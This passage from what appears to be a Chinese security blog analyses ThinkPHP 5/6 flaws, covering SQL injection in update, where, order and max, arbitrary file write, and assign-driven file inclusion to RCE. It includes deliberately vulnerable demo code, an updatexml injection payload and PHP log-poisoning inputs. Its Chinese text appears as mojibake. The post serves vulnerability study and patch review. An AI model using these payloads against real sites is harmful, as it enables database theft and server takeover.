<span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token string single-quoted-string">'Update success'</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å½±å“ç‰ˆæœ¬-6"><a class="markdownIt-Anchor" href="#å½±å“ç‰ˆæœ¬-6"></a> å½±å“ç‰ˆæœ¬</h4><p>5.1.6&lt;=ThinkPHP&lt;=5.1.7</p><h4 id="æ¼æ´åˆ†æ-6"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ-6"></a> æ¼æ´åˆ†æ</h4><ol><li>è·Ÿå…¥åˆ°updateæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906182253139.png" alt="image-20240906182253139" /></p><ol start="2"><li>ç”ŸæˆSQLè¯­å¥å’Œæ‰§è¡Œéƒ¨åˆ†</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906182504804.png" alt="image-20240906182504804" /></p><ol start="3"><li>è·Ÿå…¥ç”Ÿæˆçš„sqléƒ¨åˆ†ï¼Œè§£ædataå’Œæ›¿æ¢å­—ç¬¦</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906182603859.png" alt="image-20240906182603859" /></p><ol start="4"><li>è§£ædataéƒ¨åˆ†</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906182642513.png" alt="image-20240906182642513" /></p><ol start="5"><li>è¿™é‡Œæœ‰ä¸€ä¸ªæ‹¼æ¥çš„é€»è¾‘</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910165958837.png" alt="image-20240910165958837" /></p><p>ä»ä¸Šé¢è·Ÿä¸‹æ¥ï¼Œdataæ˜¯æˆ‘ä»¬ä¼ çš„å‚æ•°ï¼Œå¯æ§çš„å‚æ•°æ‹¼æ¥æˆsqlå¦‚ä¸‹ï¼Œå› æ­¤æœ€ååªè¦ç¬¦åˆsqlè¦æ±‚ï¼Œä¸”ç¬¬ä¸€ä¸ªå‚æ•°è¦ä¸ºä¸Šé¢swithçš„pointå³å¯ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span>  <span class="token keyword">SET</span> <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token operator">=</span> $a<span class="token punctuation">(</span><span class="token string">'$b($c)'</span><span class="token punctuation">)</span>  <span class="token keyword">WHERE</span>  <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ç€æˆ‘ä»¬æƒ³åŠæ³•é—­åˆå³å¯ã€‚æˆ‘ä»¬ä»¤ <strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>=</mo><mi>u</mi><mi>p</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>m</mi><mi>l</mi><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mi>c</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>a</mi><mi>t</mi><mo stretchy="false">(</mo><mn>0</mn><mi>x</mi><mn>7</mn><mo separator="true">,</mo><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mn>0</mn><mi>x</mi><mn>7</mn><mi>e</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mo>âˆ—</mo></msup><mo>âˆ—</mo><mi mathvariant="normal">ã€</mi><mo>âˆ—</mo><mo>âˆ—</mo></mrow><annotation encoding="application/x-tex">a = updatexml(1,concat(0x7,user(),0x7e),1)^** ã€ **</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord">7</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord cjk_fallback">ã€</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">âˆ—</span></span></span></span>b = 0</strong> ã€ <strong>$c = 1</strong> ï¼Œå³ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span> <span class="token keyword">SET</span> <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token operator">=</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token string">'0(1)'</span><span class="token punctuation">)</span> <span class="token keyword">WHERE</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç»§ç»­å·mochazzå¸ˆå‚…çš„å›¾ï¼š</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910170538409.png" alt="image-20240910170538409" /></p><h4 id="æ¼æ´ä¿®å¤-6"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤-6"></a> æ¼æ´ä¿®å¤</h4><p>ç›´æ¥åˆ é™¤äº†ç›¸å…³ä»£ç </p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910170448242.png" alt="image-20240910170448242" /></p><h3 id="3-whereæ–¹æ³•expæ³¨å…¥å…¨ç‰ˆæœ¬"><a class="markdownIt-Anchor" href="#3-whereæ–¹æ³•expæ³¨å…¥å…¨ç‰ˆæœ¬"></a> 3. whereæ–¹æ³•expæ³¨å…¥ï¼ˆå…¨ç‰ˆæœ¬ï¼‰</h3><h4 id="vuldemo-7"><a class="markdownIt-Anchor" href="#vuldemo-7"></a> VulDemo</h4><ul><li>Where ç¬¬2ä¸ªå‚æ•°ä¸ºexp</li><li>Whereç¬¬3ä¸ªå‚æ•°å¯æ§</li><li>å¼€å¯debug</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token string single-quoted-string">'select success'</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å½±å“ç‰ˆæœ¬-7"><a class="markdownIt-Anchor" href="#å½±å“ç‰ˆæœ¬-7"></a> å½±å“ç‰ˆæœ¬</h4><p>å…¨ç‰ˆæœ¬</p><h4 id="æ¼æ´åˆ†æ-7"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ-7"></a> æ¼æ´åˆ†æ</h4><ol><li>whereæ–¹æ³•ï¼ŒparseWhereExpæ˜¯è§£æå‚æ•°çš„æ–¹æ³•ï¼Œä¸å¤ªé‡è¦ã€‚</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910172921594.png" alt="image-20240910172921594" /></p><ol start="2"><li>çœ‹selectæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910173339004.png" alt="image-20240910173339004" /></p><ol start="3"><li>è·Ÿå…¥åˆ°parseWhereæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910173409721.png" alt="image-20240910173409721" /></p><ol start="4"><li>è·Ÿå…¥åˆ°buildWhereæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910173619128.png" alt="image-20240910173619128" /></p><ol start="5"><li>ä¼šæ‰§è¡Œåˆ°parseWhereItemæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910174002024.png" alt="image-20240910174002024" /></p><h4 id="æ¼æ´ä¿®å¤-7"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤-7"></a> æ¼æ´ä¿®å¤</h4><p>æœªä¿®å¤</p><h3 id="4whereæ–¹æ³•not-likeæ³¨å…¥010"><a class="markdownIt-Anchor" href="#4whereæ–¹æ³•not-likeæ³¨å…¥010"></a> 4.whereæ–¹æ³•not likeæ³¨å…¥ï¼ˆ0.10ï¼‰</h3><h4 id="vuldemo-8"><a class="markdownIt-Anchor" href="#vuldemo-8"></a> VulDemo</h4><ul><li>whereå‚æ•°å¯æ§</li><li>å¼€å¯debug</li></ul><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">public function index()    &#123;        $username &#x3D; request()-&gt;get(&#39;username&#x2F;a&#39;);        $result &#x3D; db(&#39;users&#39;)-&gt;where([&#39;username&#39; &#x3D;&gt; $username])-&gt;select();        var_dump($result);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å½±å“ç‰ˆæœ¬-8"><a class="markdownIt-Anchor" href="#å½±å“ç‰ˆæœ¬-8"></a> å½±å“ç‰ˆæœ¬</h4><p>5.0.10</p><h4 id="æ¼æ´åˆ†æ-8"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ-8"></a> æ¼æ´åˆ†æ</h4><p>æ¼æ´åˆ†æä¸ä¸Šé¢çš„expç›¸åŒï¼Œä¸è¿‡not likeæ˜¯è‡ªå·±ä¼ çš„ï¼Œä¸æ˜¯ä¸Šé¢å®šä¹‰å¥½çš„expã€‚</p><p>ä¸è¿‡å¤šåˆ†æäº†</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910180127484.png" alt="image-20240910180127484" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910180238930.png" alt="image-20240910180238930" /></p><h4 id="æ¼æ´ä¿®å¤-8"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤-8"></a> æ¼æ´ä¿®å¤</h4><p>å¢åŠ äº†å…³é”®å­—è¿‡æ»¤</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910180310523.png" alt="image-20240910180310523" /></p><h3 id="5-orderæ–¹æ³•æ³¨å…¥116-122"><a class="markdownIt-Anchor" href="#5-orderæ–¹æ³•æ³¨å…¥116-122"></a> 5. orderæ–¹æ³•æ³¨å…¥ï¼ˆ1.16-1.22ï¼‰</h3><h4 id="vuldemo-9"><a class="markdownIt-Anchor" href="#vuldemo-9"></a> VulDemo</h4><ul><li>orderæ–¹æ³•å‚æ•°å¯æ§</li><li>å¼€å¯debug</li><li>è°ƒç”¨findæ–¹æ³•</li></ul><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">public function index()    &#123;        $orderby &#x3D; request()-&gt;get(&#39;orderby&#39;);        $result &#x3D; db(&#39;users&#39;)-&gt;where([&#39;username&#39; &#x3D;&gt; &#39;mochazz&#39;])-&gt;order($orderby)-&gt;find();        var_dump($result);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å½±å“ç‰ˆæœ¬-9"><a class="markdownIt-Anchor" href="#å½±å“ç‰ˆæœ¬-9"></a> å½±å“ç‰ˆæœ¬</h4><p>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</p><h4 id="æ¼æ´åˆ†æ-9"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ-9"></a> æ¼æ´åˆ†æ</h4><p>è¿™ä¸ªä¸ä¸Šé¢åˆ†æçš„tp3ä¸€æ ·ï¼Œéƒ½æ˜¯parseOrderæ–¹æ³•çš„é—®é¢˜</p><p>ä¸åšè¯¦ç»†åˆ†æ</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910181002235.png" alt="image-20240910181002235" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910181019096.png" alt="image-20240910181019096" /></p><h4 id="æ¼æ´ä¿®å¤-9"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤-9"></a> æ¼æ´ä¿®å¤</h4><p>å¢åŠ åˆ¤æ–­ï¼‰å’Œ#</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910181040568.png" alt="image-20240910181040568" /></p><h3 id="6-maxæ–¹æ³•èšåˆæŸ¥è¯¢æ³¨å…¥00-02113-125"><a class="markdownIt-Anchor" href="#6-maxæ–¹æ³•èšåˆæŸ¥è¯¢æ³¨å…¥00-02113-125"></a> 6. maxæ–¹æ³•èšåˆæŸ¥è¯¢æ³¨å…¥ï¼ˆ0.0-0.21ï¼Œ1.3-1.25ï¼‰</h3><h4 id="vuldemo-10"><a class="markdownIt-Anchor" href="#vuldemo-10"></a> VulDemo</h4><ul><li>maxæ–¹æ³•å‚æ•°å¯æ§</li><li>å¼€å¯debug</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">max</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å½±å“ç‰ˆæœ¬-10"><a class="markdownIt-Anchor" href="#å½±å“ç‰ˆæœ¬-10"></a> å½±å“ç‰ˆæœ¬</h4><p><strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> ã€ <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong></p><h4 id="æ¼æ´åˆ†æ-10"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ-10"></a> æ¼æ´åˆ†æ</h4><p>maxæ–¹æ³•å®æˆ˜ä¸­ç”¨çš„éå¸¸å°‘</p><p>ä¸èŠ±æ—¶é—´åˆ†æäº†</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910182130657.png" alt="image-20240910182130657" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910182207168.png" alt="image-20240910182207168" /></p><h4 id="æ¼æ´ä¿®å¤-10"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤-10"></a> æ¼æ´ä¿®å¤</h4><p>å¢åŠ äº†æ­£åˆ™åŒ¹é…ï¼Œä»…å…è®¸å­—æ¯å’Œ. *</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240910182252180.png" alt="image-20240910182252180" /></p><h1 id="0x03-tp6"><a class="markdownIt-Anchor" href="#0x03-tp6"></a> 0x03 TP6</h1><h2 id="1-sessionä»»æ„æ–‡ä»¶å†™å…¥00-01"><a class="markdownIt-Anchor" href="#1-sessionä»»æ„æ–‡ä»¶å†™å…¥00-01"></a> 1. Sessionä»»æ„æ–‡ä»¶å†™å…¥ï¼ˆ0.0-0.1ï¼‰</h2><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.0ä»»æ„æ–‡ä»¶å†™.md</a></p><h1 id="0x04-æ–‡ä»¶åŒ…å«"><a class="markdownIt-Anchor" href="#0x04-æ–‡ä»¶åŒ…å«"></a> 0x04 æ–‡ä»¶åŒ…å«</h1><h2 id="1assignå‚æ•°å¯æ§å¯¼è‡´çš„æ–‡ä»¶åŒ…å«"><a class="markdownIt-Anchor" href="#1assignå‚æ•°å¯æ§å¯¼è‡´çš„æ–‡ä»¶åŒ…å«"></a> 1.assignå‚æ•°å¯æ§å¯¼è‡´çš„æ–‡ä»¶åŒ…å«</h2><h3 id="è§¦å‘æ¡ä»¶"><a class="markdownIt-Anchor" href="#è§¦å‘æ¡ä»¶"></a> è§¦å‘æ¡ä»¶</h3><ol><li>å­˜åœ¨ç±»ä¼¼assignå‡½æ•°å‚æ•°å¯æ§çš„ä»£ç </li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816144806251.png" alt="image-20240816144806251" /></p><pre class="line-numbers language-none"><code class="language-none">assignæ–¹æ³•ç¬¬ä¸€ä¸ªå˜é‡å¯æ§&#x3D;&gt;å˜é‡è¦†ç›–&#x3D;&gt;ä»»æ„æ–‡ä»¶åŒ…å«&#x3D;&gt;RCE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¢˜å¤–è¯ï¼šæœ¬åœ°æ­å»ºè°ƒè¯•ç¯å¢ƒçš„æ—¶å€™ï¼Œæç¤ºæ‰¾ä¸åˆ°æ¨¡æ¿ï¼Œè‡ªå·±åœ¨<code>Application\Home\View\Index</code>ä¸‹é¢æ–°å»ºäº†æ¨¡æ¿æ–‡ä»¶</p><h3 id="æ¼æ´åˆ†æ-11"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ-11"></a> æ¼æ´åˆ†æ</h3><ol><li>assignåªåšäº†èµ‹å€¼æ“ä½œ</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816144850011.png" alt="image-20240816144850011" /></p><ol start="2"><li>è·Ÿå…¥fetch</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816144934461.png" alt="image-20240816144934461" /></p><ol start="3"><li>è·Ÿå…¥listenå‡½æ•°</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816145025426.png" alt="image-20240816145025426" /></p><ol start="4"><li>è·Ÿå…¥exec</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816145114321.png" alt="image-20240816145114321" /></p><ol start="5"><li>è·Ÿå…¥èµ‹å€¼ç±»çš„runæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816145137086.png" alt="image-20240816145137086" /></p><ol start="6"><li>å‡½æ•°å‚æ•°æ˜¯æˆ‘ä»¬ä¼ çš„å‚æ•°ï¼Œè·Ÿå…¥æœ€åçš„æ–­ç‚¹å¤„</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816145240625.png" alt="image-20240816145240625" /></p><ol start="7"><li>è·Ÿå…¥fetchåçš„loadæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816145428421.png" alt="image-20240816145428421" /></p><ol start="8"><li>å¾ˆæ˜æ˜¾çš„å˜é‡è¦†ç›–+æ–‡ä»¶åŒ…å«ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ä¼ å…¥æ•°ç»„å˜é‡ï¼Œkeyå€¼ä¸º_filename</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816145751936.png" alt="image-20240816145751936" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240816145818684.png" alt="image-20240816145818684" /></p><p>tpçš„æ—¥å¿—è®°å½•ï¼š</p><pre class="line-numbers language-none"><code class="language-none">æœªå¼€å¯debugï¼š\Application\Runtime\Logs\Common\ï¼ˆä¸€èˆ¬é€‰æ‹©&#x2F;?s&#x3D;--&gt;&lt;?&#x3D;phpinfo();?&gt;å»è§¦å‘ï¼‰\Application\Runtime\Logs\Home\ï¼ˆå¯ä»¥ç”¨?s&#x3D;&#x2F;home&#x2F;index&#x2F;&lt;?&#x3D;phpinfo();?&gt;å»è§¦å‘ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x05-æ–‡ä»¶å†™å…¥"><a class="markdownIt-Anchor" href="#0x05-æ–‡ä»¶å†™å…¥"></a> 0x05 æ–‡ä»¶å†™å…¥</h1><h2 id="1sæ–¹æ³•å’Œfæ–¹æ³•æˆ–cachesetå‚æ•°å¯æ§"><a class="markdownIt-Anchor" href="#1sæ–¹æ³•å’Œfæ–¹æ³•æˆ–cachesetå‚æ•°å¯æ§"></a> 1.Sæ–¹æ³•å’ŒFæ–¹æ³•æˆ–Cache::setå‚æ•°å¯æ§</h2><h3 id="vuldemo-11"><a class="markdownIt-Anchor" href="#vuldemo-11"></a> VulDemo</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GET.name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">S</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ¼æ´åˆ†æ-12"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ-12"></a> æ¼æ´åˆ†æ</h3><ol><li>è·Ÿåˆ°$cacheçš„setæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906150903581.png" alt="image-20240906150903581" /></p><ol start="2"><li>åˆ†ææ–‡ä»¶å†™å…¥çš„éƒ¨åˆ†ï¼Œçœ‹ä¸¤ä¸ªå‚æ•°çš„åˆå§‹åŒ–ä½ç½®ã€‚ä¸€ä¸ªæ˜¯filenameæ–¹æ³•è·å–ï¼Œä¸€ä¸ªæ˜¯åºåˆ—åŒ–åçš„å€¼</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906151003887.png" alt="image-20240906151003887" /></p><ol start="3"><li>filenameå€¼ï¼Œmd5è®¡ç®—ï¼Œæ‹¼æ¥é…ç½®ä¸­çš„æ–‡ä»¶å¤¹å‰ç¼€ã€‚</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906151202004.png" alt="image-20240906151202004" /></p><ol start="4"><li>å†™å…¥çš„æ–‡ä»¶dataä¸­åŒ…å«//æ³¨é‡Šç¬¦ï¼Œåªè¦åœ¨dataæ·»åŠ %0dæ¢è¡Œå°±å¯ä»¥äº†</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906151545064.png" alt="" /></p><p>æ–‡ä»¶åä¸ºä¸Šé¢åˆ†æçš„ï¼Œmd5ï¼ˆnameï¼‰çš„å€¼</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906151748198.png" alt="image-20240906151748198" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906151956563.png" alt="image-20240906151956563" /></p><h3 id="fæ–¹æ³•"><a class="markdownIt-Anchor" href="#fæ–¹æ³•"></a> Fæ–¹æ³•</h3><p>Fæ–¹æ³•å¾ˆç›´æ¥ï¼Œç›´æ¥å†™æ–‡ä»¶ï¼Œä¸è¿‡å¤šåˆ†æã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906153209845.png" alt="image-20240906153209845" /></p><h1 id="0x06-tpçš„æ—¥å¿—"><a class="markdownIt-Anchor" href="#0x06-tpçš„æ—¥å¿—"></a> 0x06 TPçš„æ—¥å¿—</h1><h2 id="1-ä¸åŒçš„æ—¥å¿—å«ä¹‰"><a class="markdownIt-Anchor" href="#1-ä¸åŒçš„æ—¥å¿—å«ä¹‰"></a> 1. ä¸åŒçš„æ—¥å¿—å«ä¹‰</h2><p>é»˜è®¤æœ‰ä¸åŒçš„logè·¯å¾„</p><ul><li>Runtime\Logs\Common: 